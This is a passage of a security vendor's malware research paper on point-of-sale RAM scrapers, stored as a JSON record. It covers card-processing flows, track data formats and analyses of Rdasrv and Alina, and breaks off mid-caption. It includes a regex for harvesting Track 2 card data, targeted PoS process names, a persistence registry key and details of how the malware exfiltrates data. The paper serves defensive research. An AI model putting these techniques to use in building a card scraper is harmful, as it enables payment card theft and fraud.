{
    "id": "8c8d05d1-17d4-4b74-b863-838b01738e53",
    "created_at": "2022-10-25T16:48:19.747282Z",
    "updated_at": "2025-03-27T02:16:59.32318Z",
    "deleted_at": null,
    "sha1_hash": "425cc0813bd73bec97ef4b8d80b543bfdc94bac9",
    "title": "PoS RAM Scraper Malware: Past, Present, and Future",
    "authors": "",
    "file_creation_date": "2014-09-08T14:40:57Z",
    "file_modification_date": "2014-09-08T14:48:00Z",
    "file_size": 3796115,
    "plain_text": "# PoS RAM Scraper Malware\n\n### Past, Present, and Future\n\n#### Numaan Huq\n\nForward-Looking Threat Research Team\n\n\n-----\n\n## CONTENTS\n\nIntroduction.....................................................................................................................................1\n\nPayment Card Data Theft.........................................................................................................1\n\nEarly Warnings.........................................................................................................................1\n\nResearch Overview..................................................................................................................2\n\nPayment-Processing Ecosystem....................................................................................................3\n\nParties Involved in Credit Card Transactions...........................................................................3\n\nHow Credit Cards Are Processed.............................................................................................5\n\nPoS RAM Scraping........................................................................................................................6\n\nCredit Card Data.......................................................................................................................6\n\nPAN and Luhn..........................................................................................................................7\n\nPCI DSS in a Nutshell..............................................................................................................8\n\nLow-Hanging Fruits..................................................................................................................9\n\nPoS RAM Scraper Families..........................................................................................................10\n\nPoS RAM Scraper Evolution..................................................................................................10\n\nTREND MICRO LEGAL DISCLAIMER\n\nThe information provided herein is for general information and educational purposes only. It is not intended and should not be construed to constitute legal advice.\nThe information contained herein may not be applicable to all situations and may not reflect the most current situation. Nothing contained herein should be relied on\nor acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise. Trend\nMicro reserves the right to modify the contents of this document at any time without prior notice.\n\nTranslations of any material into other languages are intended solely as a convenience. Translation accuracy is not guaranteed nor implied. If any questions arise\nrelated to the accuracy of a translation, please refer to the original language official version of the document. Any discrepancies or differences created in the\ntranslation are not binding and have no legal effect for compliance or enforcement purposes.\n\nAlthough Trend Micro uses reasonable efforts to include accurate and up-to-date information herein, Trend Micro makes no warranties or representations of any kind\nas to its accuracy, currency, or completeness. You agree that access to and use of and reliance on this document and the content thereof is at your own risk. Trend\nMicro disclaims all warranties of any kind, express or implied. Neither Trend Micro nor any party involved in creating, producing, or delivering this document shall\nbe liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of business profits, or special damages, whatsoever arising\nout of access to, use of, or inability to use, or in connection with the use of this document, or any errors or omissions in the content thereof. Use of this information\nconstitutes acceptance for use in an “as is” condition.\n\n\n-----\n\nRdasrv....................................................................................................................................11\n\nAlina........................................................................................................................................13\n\nVSkimmer...............................................................................................................................17\n\nDexter.....................................................................................................................................23\n\nBlackPOS...............................................................................................................................28\n\nDecebal..................................................................................................................................33\n\nNext-Generation PoS RAM Scrapers...........................................................................................37\n\nJackPOS.................................................................................................................................37\n\nSoraya....................................................................................................................................38\n\nChewBacca............................................................................................................................38\n\nBrutPOS.................................................................................................................................39\n\nBackoff....................................................................................................................................40\n\nWhat Will the Next Generation of PoS RAM Scrapers Look Like?..............................................42\n\nGeneral Characteristics..........................................................................................................43\n\nData Collection.......................................................................................................................46\n\nData Exfiltration......................................................................................................................49\n\nInfection Methods.........................................................................................................................53\n\nUsing a Bag of “Old” Tricks.....................................................................................................53\n\nInside Jobs........................................................................................................................53\n\nPhishing and Social Engineering......................................................................................53\n\nVulnerability Exploitation...................................................................................................54\n\nPCI DSS Noncompliance Abuse.......................................................................................56\n\nCyber Attacks....................................................................................................................56\n\nUnderground Credit Card Scene..................................................................................................58\n\nData-Exfiltration Methods.......................................................................................................58\n\nData Validation.......................................................................................................................59\n\n\n-----\n\nWho Are Behind PoS Attacks?...............................................................................................60\n\nStolen Card Data for Sale.......................................................................................................61\n\nUsing Stolen Credit Cards......................................................................................................62\n\nLooking Beyond the Horizon........................................................................................................65\n\nDetection Statistics.................................................................................................................65\n\nCredit Card Data Breaches in the United States....................................................................66\n\nOther Credit Card Data Theft Methods...................................................................................69\n\nNew Credit Card Technologies...............................................................................................70\n\nEMV..................................................................................................................................70\n\nContactless RFID Cards...................................................................................................71\n\nConclusion and Recommendations..............................................................................................73\n\nPrevention..............................................................................................................................73\n\nHardware Based...............................................................................................................73\n\nSoftware Based................................................................................................................73\n\nPolicy Based.....................................................................................................................74\n\nTrend Micro Solutions.............................................................................................................74\n\nConclusion..............................................................................................................................75\n\nAppendix......................................................................................................................................76\n\nReferences...................................................................................................................................88\n\n\n-----\n\n## INTRODUCTION\n\n#### Payment Card Data Theft\n\nStealing payment card data has become an\neveryday crime that yields quick monetary\ngains. The goal is to steal the data stored on\nthe magnetic stripe of payment cards, clone\nthe cards, and run charges on the accounts\nassociated with them. Criminals have been\nphysically skimming payment cards such as\ndebit and credit cards for a while now. The\ncommon techniques for skimming payment\ncards include but are not limited to the\nfollowing:\n\n   - Making a rub of payment cards\n\n   - Rigging ATMs or gas pumps with fake\npanels that steal data\n\n   - Modifying stores’ point-of-sale (PoS)\nterminals\n\n   - Using off-the-shelf hardware\nkeyloggers on cash registers [1]\n\nThe techniques mentioned above require\nphysical access to the cards or the devices\nused to process them. As such, criminals\nface big risks of getting apprehended. Also,\nskimmers cannot be readily mass-deployed\nfor maximum effectiveness. Criminals\nhave, therefore, resorted to using malicious\nsoftware to steal data primarily from credit\ncards. Such solutions provide them a certain\ndegree of anonymity, are easier to deploy,\nand are more flexible should they wish to\nquickly modify their solutions in order to\nadjust to changing conditions.\n\nThis research paper focuses on credit card\ndata theft, which makes up the majority of\nthe payment card data breaches seen to\n\n\ndate. The earliest credit-card-data-stealing\nmalware were primarily keyloggers that,\nin most cases, were installed on victims’\nsystems as a payload of other malware or\nthrough phishing attacks. As effective as\nkeyloggers are, they cannot capture all of the\nmagnetic stripe data on credit cards and yield\nless data than RAM scraping. Two major\ndevelopments have been seen in credit-carddata-stealing malware and the criminals who\nuse them:\n\n   - To exponentially increase their\npayback from stealing credit card\ndata, criminals are now directly\ntargeting the businesses that process\ncredit cards instead of going after\nindividual victims.\n\n   - Criminals are exploiting the fact that\ncredit card magnetic stripe data\ntemporarily resides in plain text in\nthe RAM of PoS devices during\nprocessing.\n\n#### Early Warnings\n\nThe earliest evidence of PoS RAM scraping\nwas recorded in a Visa® Data Security\nAlert issued on 2 October 2008. [2] Before\nstandalone PoS RAM scraper malware were\ndeveloped, cybercriminals were attempting\nto install debugging tools on PoS devices\nin order to dump entire sets of magnetic\nstripe data. The Visa report revealed that\nsuch debugging tools could effectively parse\nunencrypted sensitive data not written to\ndisk from volatile memory (i.e., RAM). Visa\nidentified that cybercriminals obtained access\nto PoS devices through insecure remote\naccess or poorly configured networks.\n\n\n-----\n\nIn 2009, Verizon also introduced PoS RAM\nscrapers, along with victim profiles. [3] Back\nthen, the malware only accounted for\n4% of the total number of breaches Verizon\ninvestigated. These primarily targeted\ncompanies in the retail and hospitality\nindustries. Verizon had a difficult time\nclassifying the attacks because they were\nnew. In this year’s report, the number of PoSRAM-scraper-related breaches rose to\n14% of the total and primarily targeted\ncompanies in the accommodation, food\nservices, and retail industries. [4] The United\nStates Computer Emergency Readiness\nTeam (US-CERT) also formally issued an\nalert on malware targeting PoS devices on\n2 January 2014, after targeted attacks\nagainst big name retailers made headlines.\n\n[5], [6] The attackers used PoS RAM scrapers\nto steal credit card data.\n\n\n#### Research Overview\n\nThis research paper examines the\nPoS ecosystem. It describes how PoS\ntransactions work from the moment\ncustomers swipe their credit cards to when\nthey get charged for their purchases. It\ndescribes what types of data resides in the\nmagnetic stripe of payment cards. It looks at\nthe evolution of PoS RAM scrapers—from\ntheir humble beginnings to how they have\nbecome today’s industrialized threats. It\nalso presents the various PoS RAM scraper\ninfection methods by providing technical\noverviews of the most prevalent PoS RAM\nscraper malware families that have affected\nbusinesses to date. It details the dataexfiltration techniques used by PoS RAM\nscrapers and examines what happens to\nthe data that cybercriminals exfiltrate. It also\nattempts to predict future PoS attack vectors.\nFinally, the paper provides prevention\nstrategies that companies can follow to\nprotect against PoS RAM scrapers.\n\n\n-----\n\n## PAYMENT-PROCESSING ECOSYSTEM\n\n\nBefore delving into PoS RAM scraper\nmalware analysis, let us first take a look\nat the payment-processing ecosystem—\nwhat parties are involved as well as how\npayment card transactions are authorized\nand settled. This will help us understand\nexisting vulnerabilities in the ecosystem that\ncybercriminals exploit.\n\n#### Parties Involved in Credit Card Transactions\n\nA credit card transaction is a multistep\nprocess that involves several other parties,\napart from consumers and merchants.\nThe following briefly describe the different\nparties involved in credit-card-transaction\nprocessing: [7], [8], [9], [10]\n\n**•** **Consumer: Cardholder who**\npurchases goods and services with a\ncredit card.\n\n**•** **Merchant: Goods and services**\nprovider that accepts credit card\npayments.\n\n**•** **Acquirer: Bank that processes and**\nsettles a merchant’s credit card\ntransactions with an issuer.\n\n**•** **Issuer: Bank or financial institution**\nthat issues credit cards to consumers.\n\n**•** **Card brand: Visa, MasterCard®,**\nAmerican Express (AMEX)™, and\n\n\nothers whose networks are used\nto facilitate interactions between\nacquirers and issuers when\nauthorizing and settling transactions.\n\n**•** **Payment service provider (PSP):**\nThird-party service provider that\nhandles payment transactions\nbetween merchants and multiple\nacquirers. The advantage of using a\nPSP is that merchants do not need\nto set up and to maintain dedicated\ncommunication channels with different\nacquirers. Such a service is part of\nthe PSP’s service package offerings.\n\n**•** **Payment switch: In-house or third-**\nparty service provider that provides\nrouting services between merchants\nand multiple PSPs.\n\nConsumers swipe their cards on merchants’\nPoS devices to purchase goods and\nservices. The PoS devices send the credit\ncard data to merchants’ PoS systems.\nThe PoS systems contact the PSP, who,\ndepending on what card brand or type was\nused, contacts designated acquirers for\ntransaction authorization. Acquirers use the\ncard brands’ networks to contact credit card\nissuers. Issuers return an authorization status\nto acquirers via card brands’ networks. The\nacquirers then pass on the authorization to\nthe PSP who forwards it to the PoS systems\nand devices, which complete the transaction.\nThis communication occurs in a matter of\nseconds.\n\n\n-----\n\nMerchant’s PoS Merchant’s PoS\nCardholder hardware software\n\nPayment\nservice\n\nIssuer\n\n\nCredit card\nbrand network\n\n\nAcquirer Acquirer Acquirer Acquirer\nA B C D\n\n\n**Figure 1: Transaction flow model for regular merchants**\n\nMerchant’s PoS Merchant’s PoS\nCardholder hardware software\n\nPayment\nswitch\n\nIssuer\n\n\nPayment\nservice\nprovider C\n\nAcquirer\nD\n\n\nPayment\nservice\nprovider B\n\nAcquirer\nC\n\n\nCredit card\nbrand network\n\n\nAcquirer\nA\n\n\nPayment\nservice\nprovider A\n\nAcquirer\nB\n\n\n**Figure 2: Transaction flow model for large merchants**\n\n\n-----\n\nLarge merchants with high transaction\nvolumes have a slightly different transaction\nflow model.\n\nLarge merchants normally contract multiple\nPSPs in order to support a diverse range of\npayment options (e.g., all major debit and\ncredit card brands, gift cards, store-branded\ncards, etc.) and to get the best transactionprocessing rates to reduce operating costs.\nPoS systems send transaction requests to\npayment switches that route requests to the\nappropriate PSPs for processing. The rest of\nthe process remains unchanged, apart from\nthe additional payment switch step.\n\n#### How Credit Cards Are Processed\n\nCredit card transactions involve the following\nbasic steps:\n\n**•** **Authorization: Cardholders request**\nto purchase goods and/or services\nfrom merchants by paying for them\nusing credit cards. Merchants submit\ntransaction requests to acquirers via\nPSPs. Acquirers send the transaction\nrequests via cardholders’ brand\nnetworks to issuers. Issuers return\nauthorization codes via card brands’\nnetworks to acquirers. Acquirers then\nforward authorization codes via PSPs\nto merchants. If the transactions\nare authorized, merchants give\ncardholders the goods and/or\nservices they requested.\n\n**•** **Batching: Merchants store an entire**\nday’s authorized sales in a batch.\nAt the end of the day, they send the\nbatch via PSPs to acquirers in order\nto receive payment.\n\n**•** **Clearing: Acquirers send the batch**\nvia card brands’ networks to issuers\nin order to request payment. Card\nbrands’ networks sort out each\ntransaction to the right cardholders.\nIssuers then transfer requested\n\n\nfunds via card brands’ networks to\nacquirers.\n\n**•** **Funding: Acquirers send merchants**\npayment via PSPs. Issuers then\nbill cardholders the amount paid to\nmerchants plus fees or interest.\n\nData takes on the following states in the\ntransaction process:\n\n**•** **Data in memory: All of the credit**\ncard data is temporarily stored in\nplain text in the RAM of merchants’\nPoS systems during processing.\nCybercriminals use PoS RAM\nscrapers to steal this data.\n\n**•** **Data at rest: Merchants’ PoS**\nsystems store transaction data for a\nshort period of time (e.g., for batching)\nas well as a partial set of data for\na long period of time for record\npurposes in log files or a database.\nThe data stored is encrypted. There\nis no specific encryption algorithm\nrequirement defined in PCI DSS.\nInstead, PCI DSS mandates the use\nof strong cryptography (i.e., minimum\nkey length of 112 bits). Vendors can\nchoose which encryption algorithm\nthey want to implement to protect the\ndata as long as the algorithm meets\nthe minimum strong cryptography\nrequirements.\n\n**•** **Data in transit: The data is internally**\ntransferred over LANs or WANs\nand externally over the Internet.\nEncryption is mandatory for data\ntransferred over the Internet but not\nfor information transferred over LANs\nor WANs.\n\nCybercriminals attack transaction data\nthat resides in memory because it is the\neasiest to target. As attacks become more\nsophisticated and larger in scope, data at rest\nand in transit will also be targeted.\n\n\nIssuers then transfer requested\n\n\n-----\n\n## PoS RAM SCRAPING\n\n#### Credit Card Data\n\nThe magnetic stripe of payment cards has\nthree Data Tracks—1, 2, and 3. Payment\ncards only use Tracks 1 and 2, which\nhave been defined the in International\nOrganization for Standardization (ISO)/\nInternational Electrotechnical Commission\n(IEC) 7813 as: [11]\n\n\nThe International Air Transport Association\n(IATA) created the Track 1 standard, which is\nrecorded at 210 bits per inch and contains\n79 alphanumeric characters. [12]\n\nThe American Bankers Association (ABA),\nmeanwhile, created the Track 2 standard,\nwhich is recorded at 75 bits per inch and\ncontains 40 numeric characters.\n\n|Track 1 Standard|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|\n|---|---|---|---|---|---|---|---|---|---|---|\n|SS|FC|PAN|FS|CN|FS|ED|SC|DD|ES|LRC|\n|SS: Start sentinel (%) FC: Format code (B or b) PAN: Primary account number (up to 19 digits long) FS: Field separator (^) CN: Cardholder’s name (up to 26 characters long) ED: Expiry date (in the form, “YYMM”) SC: Service code DD: Discretionary date (may include the Card Verification Value [CVV]/Code, the PIN Verification Value, and the PIN Verification Key Indicator) ES: End sentinel (?) LRC: Longitudinal redundancy check|||||||||||\n\n|Track 2 Standard|Col2|Col3|Col4|Col5|Col6|Col7|Col8|\n|---|---|---|---|---|---|---|---|\n|SS|PAN|FS|ED|SC|DD|ES|LRC|\n|SS: Start sentinel (;) PAN: Primary account number (up to 19 digits long) FS: Field separator (=) ED: Expiry date (in the form, “YYMM”) SC: Service code DD: Discretionary data (similar to that in Track 1) ES: End sentinel (?) LRC: Longitudinal redundancy check||||||||\n\n\n-----\n\nCredit cards also contain a three- to four-digit\nnumber printed or embossed on either the\nfront or back side called the “CVV/CVV2,”\n“Card Verification Number (CVN),” “Card\nSecurity Code (CSC),” “Card Validation\nCode (CVC2),” or some other similar term.\nCredit-card-issuing institutions have different\nnames for this number but it is a security\nverification feature used in “card-not-present”\ntransactions (e.g., made via telephone,\nmail order, online, etc.) wherein merchants\ncannot physically verify if cards are present\nfor transactions. Note that, by design, this\nnumber is not stored in Tracks 1 and 2 and\nwithout it, a perfect counterfeit credit card\ncannot be created.\n\n**IIN Range**\n\n**Card Brand** **(Card Number**\n\n**Starts With)**\n\n34\nAMEX\n37\n\n54\nDiners Club™\n55\n\n6011\n622126‒622925\n\nDiscover\n\n644‒649\n65\n\nJCB 3528‒3589\n\nMasterCard 50‒55\n\nVisa 4\n\nThe length of individual account numbers\n(i.e., As) can vary and reach up to 12 digits.\nThe final digit (i.e., C) is a “check” digit\ncalculated using the Luhn algorithm—a\n\n\n#### PAN and Luhn\n\nThe Primary Account Number (PAN) format,\ndefined in ISO/IEC 7812, is commonly\n16 digits long but can reach up to 19 digits\nand has the following format: [13]\n```\n  IIII-IIAA-AAAA-AAAC\n\n```\nThe first six digits (i.e., Is) are known as\nthe “Issuer Identification Number (IIN).”\nIts first digit is called the “Major Industry\nIdentifier (MII).” Major card networks—Visa,\nMasterCard, Discover, JCB®, AMEX, and\nothers—all have unique IIN ranges that\nidentify which institution issued a card. [14]\n\n**Length**\n**Validation**\n**(Number of Digits)**\n\n15 Luhn\n\n16 Luhn\n\n16 Luhn\n\n16 Luhn\n\n16 Luhn\n\n13\nLuhn\n16\n\nsimple checksum formula, not a\ncryptographic hash function, defined in ISO/\nIEC 7812 and designed to catch errors in\nprevious digits of the PAN. All valid credit\n\n|Common Card Brand IIN Ranges|Col2|Col3|Col4|\n|---|---|---|---|\n|Card Brand|IIN Range (Card Number Starts With)|Length (Number of Digits)|Validation|\n|AMEX|34 37|15|Luhn|\n|Diners Club™|54 55|16|Luhn|\n|Discover|6011 622126‒622925 644‒649 65|16|Luhn|\n|JCB|3528‒3589|16|Luhn|\n|MasterCard|50‒55|16|Luhn|\n|Visa|4|13 16|Luhn|\n\n\n-----\n\ncard numbers must pass the Luhn validation\ncheck. Note, the Luhn algorithm does not\nverify any other information on the card apart\nfrom the PAN.\n\nPoS RAM scrapers generally use regular\nexpression (regex) matches to search for and\nharvest Tracks 1 and 2 credit card data from\nthe process memory space in the RAM. The\nfollowing is a sample regex to find Track 2\ndata:\n```\n  ([0-9]{15,16}[D=](0[7-9]|1[0-5])\n  ((0[1-9])|(1[0-2]))[0-9]{8,30})\n\n```\nDepending on the complexity of the regex,\nit can incorrectly capture garbage data\nfrom the RAM in addition to valid card\ndata. A well-defined regex will return clean\nresults but may be computationally more\nexpensive compared with a looser one. If\nthe cybercriminals’ goal is to quickly capture\ndata from the RAM, efficiency is more\nimportant than quality. To circumvent bad\ndata problems, some PoS RAM scrapers\nimplement Luhn validation to check the\ncard data harvested prior to exfiltration.\nCybercriminals have also been known to use\ncracked commercial data loss prevention\n(DLP) products that merchants use for\nPayment Card Industry (PCI) compliance\nfor validating exfiltrated data offline before\nselling it in underground forums.\n\n#### PCI DSS in a Nutshell\n\nPCI Data Security Standard (PCI DSS) refers\nto a set of requirements designed to ensure\nthat all companies that process, store, or\ntransmit credit card information maintain a\nsecure environment. [15]\n\nPCI DSS does not offer new secure\ntechnologies to protect electronic payment\nsystems but provides requirements to\nbuild up layers of security control around\nexisting ones. PCI DSS v1.0 was published\nin December 2004, long after electronic\npayment systems were developed and\n\n\ndeployed worldwide. At this point, defining,\ndeveloping, and deploying a brand new\nsecure technology standard for payment\ncards would be extremely expensive.\n\nPCI DSS has the following 12 major\nrequirements: [16]\n\n   - Install and maintain a firewall\nconfiguration to protect cardholder\ndata.\n\n   - Do not use vendor-supplied defaults\nfor system passwords and other\nsecurity parameters.\n\n   - Protect stored cardholder data.\n\n   - Encrypt cardholder data when\ntransmitted across open, public\nnetworks.\n\n   - Protect all systems against malware\nand regularly update anti-malware\nsolutions.\n\n   - Develop and maintain secure systems\nand applications.\n\n   - Restrict access to cardholder data on\na need-to-know basis.\n\n   - Identify and authenticate access to\nsystem components.\n\n   - Restrict physical access to cardholder\ndata.\n\n   - Track and monitor all access to\nnetwork resources and cardholder\ndata.\n\n   - Regularly test security systems and\nprocesses.\n\n   - Maintain policies that address\ninformation security for all personnel.\n\nThe merchants and vendors in every PoS\ntransaction chain are ultimately responsible\n\n\ntransaction chain are ultimately responsible\n\npayment systems were developed and\n\n\n-----\n\nfor implementing PCI DSS. Lack of federated\nimplementation of PCI DSS means that\npayment systems are often insecure even if\nthey are theoretically PCI compliant.\n\n#### Low-Hanging Fruits\n\nCybercriminals have found low-hanging\nfruits for grabs within this layered security\nframework—unencrypted credit card data.\nAfter merchants swipe credit cards, the data\nstored on them temporarily resides in plain\ntext in the PoS software’s process memory\nspace in the RAM. PoS RAM scrapers\nretrieve a list of running processes and\nload-inspects each process’s memory for\ncard data. They run searches on the process\nmemory space and can retrieve entire sets\nof Tracks 1 and 2 credit card data. The real\nchallenge lies in finding a reliable method\nto infect PoS systems with RAM scrapers.\nCybercriminals use a variety of tried-andtested infection methods such as insider jobs,\nspamming or phishing, social engineering,\ncredential theft, lateral movement from\nexisting infections, software exploitation,\n\n\nabusing PCI DSS noncompliance, and others\nto infect PoS systems.\n\nMerchants and vendors in the PoS\ntransaction chain are responsible for\nimplementing PCI DSS. Note that merchants\nare most susceptible to PoS RAM scraper\ninfections, as they are in the front line\nof customer payment processing. Small\nmerchants such as small stores, independent\nretail outlets, neighborhood grocery stores,\nand the like do not always possess the\ntechnical know-how to properly implement\nor manage PCI DSS and so can become\nsusceptible to targeted attacks. The only\ncaveat for cybercriminals when targeting\nsmall merchants is that they do not net\nbig card data volumes. Big merchants, on\nthe other hand, have their own IT security\ndepartments and are PCI DSS compliant but\nare also lucrative targets for bigger payoffs.\nThe end of 2013 showed that carefully\nplanned targeted attacks could successfully\nbreach the IT defenses and steal credit card\ndata from the PoS systems of even big name\nretailers.\n\n\n-----\n\n## PoS RAM SCRAPER FAMILIES\n\n\n#### PoS RAM Scraper Evolution\n\nThe earliest evidence of PoS RAM scraping\nwas the Visa Data Security Alert issued on\n2 October 2008. Back then, cybercriminals\nattempted to install debugging tools on PoS\nsystems to dump Tracks 1 and 2 credit card\ndata from RAM. PoS RAM scrapers have\nquickly evolved since then to include:\n\n**•** **Multiple components: Today’s**\nattacks use several components that\neach performs a specialized function.\n\n**•** **Single binary: All of the necessary**\nfunctionality come packaged in a\nsingle binary.\n\n**•** **Networking functionality: Today’s**\nmalware have additional networking\nfunctionality (e.g., File Transfer\nProtocol [FTP], Tor, HTTP, etc.) and\n\n\ncan exfiltrate stolen card data to\nremote servers.\n\n**•** **Bot functionality: Malware with this**\nfeature can receive commands from\ncommand-and-control (C&C) servers.\n\n**•** **Kill switch functionality: This**\nfeature allows C&C servers to instruct\nbots to uninstall malware, effectively\nremoving all traces of a breach.\n\n**•** **Encryption: Today’s malware encrypt**\nthe data that they exfiltrate.\n\n**•** **Development kits: These allow**\nanyone to create customized binaries\nthat they can then use to breach\nvictims’ systems.\n\n**•** **Multiple exfiltration techniques: A**\nsingle binary can use several dataexfiltration techniques.\n\n\nBackoff\n\n\nRdasrv BrutPOS\n\nBlackPOS VSkimmer ChewBacca Decebal\n\n2012 2013 2014\n\n**Figure 3: PoS RAM scraper family tree**\n\n|Col1|Col2|Col3|xter|Col5|Col6|Col7|Col8|\n|---|---|---|---|---|---|---|---|\n||||xter|||||\n|||||||||\n|Rdasrv Bla|AALlIinNaA|||JackPOS||Br|utP B|\n||ckPOS|||||||\n|||||||||\n||||VSkimmer Chew|Bacca De|cebal|||\n|||||||||\n\n\n**Figure 3: PoS RAM scraper family tree**\n\n\n-----\n\n#### Rdasrv\n\nRdasrv—one of the earliest PoS RAM\nscrapers—was first discovered at the end\nof 2011. [17] It has no specific family name\nso it is called by the service name that\nit installs—rdasrv. Trend Micro detects\nRdasrv binaries as BKDR_HESETOX.SVC,\nTSPY_POCARDL.BD, TSPY_POCARDL.AJ,\nTROJ_BANKER.QPA, and TROJ_BANKER.\nDPS. [18]\n\nWhen first executed, the malware is installed\nas a service called “rdasrv.” Name variations\nexist but rdasrv is most commonly used. The\nsample analyzed installed a service called\n_“rdpclip.” The installer script executes the_\nmalware using the /install parameter. The\nmalware then passes function cc_data_\n_scraper_main to StartServiceCtrlDispatcher._\nThe cc_data_scraper_main function registers\nitself to handle service control requests using\n_RegisterServiceCtrlHandler. The malware_\nis now installed and ready to scrape the\nprocess memory for Tracks 1 and 2 credit\ncard data.\n\nUnlike most PoS RAM scrapers, Rdasrv\ndoes not inspect all or even a subset of all\nof the running processes. It only inspects\nprocess names that have been hardcoded\nin its binary. It iterates over all of the running\nprocesses and uses a string-compare\nfunction to match target process names. If a\ntarget process is found, it calls OpenProcess\nusing the PROCESS_ALL_ACCESS flag\nto obtain a handle then reads the memory’s\ncontent via ReadProcessMemory.\n\n\nRegexes to match Tracks 1 and 2 credit\ncard data that are hardcoded in the malware\nbinary run on the process memory content\nthat Rdasrv reads.\n\nTracks 1 and 2 credit card data scraped from\nthe process memory are written to disk in a\nfile called “data.txt” or “current.txt.” Because\nRdasrv does not have data-exfiltration\nfunctionality, the data file is most likely\nmanually removed or retrieved via remote\naccess.\n\nRdasrv has been designed to target\ncompanies in the food services and\nhospitality industries. As previously\nmentioned, it only inspects process names\nfor PoS software that are hardcoded in its\nbinary. The PoS processes that Rdasrv\ntargets include:\n\n**_•_** **_ifs.exe: MICROS Restaurant_**\nEnterprise Solution (RES)\n\n**_•_** **_ccs.exe: MICROS RES_**\n\n**_•_** **_utg2.exe: Shift4 credit-card-_**\nprocessing application\n\n**_•_** **_edcsvr.exe: Aloha Electronic Draft_**\nCapture (EDC) PoS Restaurant\nSystem\n\nRdasrv has various versions hardcoded\nwith different target process names, most\nprobably because cybercriminals collect\ninformation about their targets’ operating\nenvironments before dispatching customized\nbinaries.\n\n\n-----\n\n**Figure 4: Rdasrv passes cc_data_scraper_main to StartServiceCtrlDispatcher**\n\n**Figure 5: Process that looks for target processes—ccs.exe and ifs.exe**\n\n**Figure 6: Regexes used to match Tracks 1 and 2 credit card data**\n\n**Figure 7: Rdasrv writes the data to data.txt**\n\n\n-----\n\n|Rdasrv Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|05492b4f4d6b819d54809ebca0980da133067e89|TSPY_POCARDL.BD|\n|61395ad59bbb111aa2a84ccd1e1cb4da3c38211a|TROJ_BANKER.QPA|\n|df74d626df43247fdcd380bbc37b68f48b8c11d4|BKDR_HESETOX.SVC|\n|daee813c73d915c53289c817e4aadaa6b8e1fb96|BKDR_HESETOX.SVC|\n|2440cf33693651458b209b91e05d6466e4dc25dd|TSPY_POCARDL.AJ|\n|fb59188d718f7392e27c4efb520dceb8295a794f|BKDR_HESETOX.SVC|\n|06a0f4ed13f31a4d291040ae09d0d136d6bb46c3|BKDR_HESETOX.SVC|\n|b8c1f7d28977e80550fcbaf2c10b222caea53be8|TSPY_BANKER.DPS|\n|48db3a315d9e8bc0bce2c99cfde3bb9224af3dce|BKDR_HESETOX.SVC|\n\n\n#### Alina\n\nAlina is a well-known PoS RAM scraper that\nwas first discovered sometime in\nOctober 2012. [19] The Alina source code is\nactively developed and is regularly updated.\nIts latest known version is 6.x.\n\nWhen first executed, Alina installs itself on\nvictims’ systems. It follows this step-by-step\ninstallation process:\n\n1. It checks if an Alina code update is\n\navailable for download. It then checks\nfor and removes any existing Alina\ncode on victims’ systems. It then\nprepares to install the latest version of\nthe code available or itself.\n\n2. Alina has a list of socially engineered\n\nfilenames hardcoded in its binary. It\n\n\nrandomly selects a name from this list\nand copies itself to the %APPDATA%\ndirectory using the chosen filename.\nIt also adds the filepath to an Auto\nStart runkey to remain persistent. The\nsample analyzed installed itself as\n_java.exe and executed the following_\nactions:\n\n   - Add java.exe to the %APPDATA%\ndirectory\n\n   - Add the following key to the\nregistry:\n```\nHKEY_CURRENT_USER\\Software\\\nMicrosoft\\Windows\\CurrentVersion\\\nRun\\java value: %APPDATA%\\java.exe\n\n```\n3. The final step in the Alina installation\n\nprocess executes the copy in the\n_%APPDATA% directory using the_\n\n\n_%APPDATA% directory using the_\n\n\n-----\n\n_alina=<original_alina> parameter._\nThe sample analyzed executed the\nfollowing action via the application\nprogramming interface (API) call:\n```\n  CreateProcessA ARGs:(%APPDATA%\\\n  java.exe, alina=%WorkingDir%\\\n\n  4E682B34C3E122E55D21F9A501B9F13AF\n\n  B7437A9_samp.exe,,,,,,,,1776\n\n```\nThis step terminates the original\nAlina process and deletes the\nassociated file on disk, completing\nthe installation. Alina is now ready\nto scrape the process memory for\nTracks 1 and 2 credit card data. Note\nthat every time infected systems\nreboot, the Alina binary reinstalls\nitself.\n\nAlina inspects running processes on infected\nsystems via the CreateToolhelp32Snapshot\nmethod that PoS RAM scrapers commonly\nuse. It calls CreateToolhelp32Snapshot\nto take a snapshot of all of the processes\ncurrently running on the system as well as\nthe heaps, modules, and threads that they\nuse. It then calls Process32First, which\nretrieves information about the first process\nencountered in the snapshot. The process\nmemory for certain programs such as\nFirefox®, Skype, Chrome™, and others can\ndramatically increase in size during runtime.\nFinding Tracks 1 and 2 credit card data in a\nbrowser’s process memory is computationally\nexpensive and highly unlikely. Because of\nthis, Alina maintains a blacklist of processes\nto skip. If the current process is not in the\nblacklist, Alina opens a process object using\n_OpenProcess and reads the memory content_\nvia ReadProcessMemory. Regexes to match\nTracks 1 and 2 data, which are hardcoded\nin the Alina binary, are run on the process\nmemory content that Alina reads.\n\n\nOnce regex matching in the process\nmemory is complete, Alina retrieves the next\nprocess recorded in the snapshot using\n_Process32Next and the inspection cycle is_\nrepeated. Alina uses HTTP POST to exfiltrate\nthe Tracks 1 and 2 data that it scrapes and\nsends it to C&C servers, the addresses of\nwhich are hardcoded in its binary. HTTP\nPOST requests are used because they are\nnot cached, not saved in history, and have no\ndata-sending length restrictions.\n\nThe format that Alina uses when exfiltrating\ndata has significantly changed since it was\nfirst released. [20] Earlier versions sent\nexfiltrated data as plain text. Later on, the\ndata was XOR-encrypted with a key and the\nencrypted data was encoded as hexadecimal\ndigits. For a while, Alina required C&C\nservers to respond with a status code before\ninitiating data exfiltration. The Alina binary\nis hardcoded with several C&C server\naddresses. If a server is unresponsive or\nfails to return the expected status code, the\nmalware contacts the next server in the list.\nIt also sends victims’ computer and user\ninformation, along with exfiltrated credit\ncard data, to C&C servers. Alina version 5.x\nencrypts exfiltrated data using two different\nkeys. The header block of the exfiltrated data\nis XOR-encrypted with one key while the\nheader contains the second key that the rest\nof the data is XOR-encrypted with.\n\nAlina is a general-purpose PoS RAM scraper\ncompared with Rdasrv because it does not\nrestrict itself to targeting a handful of known\nPoS applications. It can be deployed, without\nbeing customized, to a wider pool of victims,\nmost likely via social engineering. A steady\nstream of code updates and new functionality\nstrongly imply that the Alina codebase is\nmaturing and that the malware is enjoying\nrecurring success.\n\n\n-----\n\n**Figure 8: Alina checks for updates and deletes existing 